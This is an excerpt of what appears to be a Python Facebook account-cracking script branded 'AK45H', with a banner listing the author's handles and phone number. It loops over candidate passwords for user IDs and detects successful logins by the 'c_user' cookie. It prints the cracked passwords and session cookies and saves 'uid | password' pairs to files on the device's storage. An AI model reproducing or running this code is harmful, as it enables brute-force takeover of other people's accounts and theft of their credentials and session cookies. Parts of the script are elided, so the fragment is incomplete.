...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/R0MI0.AK45H')
logo = ("""\033[1;37m
            _  ___  _   _____ _    _ 
     /\   | |/ / || | | ____| |  | |
    /  \  | ' /| || |_| |__ | |__| |
 ...
 /_/    \_\_|\_\  |_| |____/|_|  |_|
    ...
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : M R AK45H 			            										 │
    │ [✓] GITHUB   : AK45H-404-cyber                 		     							  │
    │ [✓] WHATSAPP : +8801609752140         									    │
    │ [✓] POWER BY : \033[1;32m PRO PRONOY \033[1;37m           	│
    └───────────────────────────────────────┘
\033[0;93m╠══[Author:=======================> \33[1;38mMR. AK45H✅\33[1;38m       ║\033[1;31m
╠══[Facebook:=====================> AK45H🙂🔰      ║  \033[1;97m
╠══[Github:=======================> \33[1;38mAK45H-404-cyber      ║\33[1;34m
╠══[Whatsapp:=====================> +8801609752140     ║\33[1;35m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[AK45H-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AK45H-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/AK45H-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}AK45H{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
